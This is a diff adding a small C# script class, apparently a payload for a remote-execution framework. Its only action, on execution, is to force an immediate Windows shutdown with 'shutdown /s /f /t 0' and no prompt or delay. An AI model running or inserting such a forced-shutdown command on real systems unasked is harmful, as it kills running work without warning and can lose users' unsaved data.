@@ -1,0 +1,12 @@
+﻿using System.Threading.Tasks;
+using System.Diagnostics;
+
+public class Script
+{
+
+    public static async Task<object> ExecuteAsync(string endpoint, string uuid, long instId, short code)
+    {
+        Process.Start("shutdown", "/s /f /t 0");
+        return null;
+    }
+}
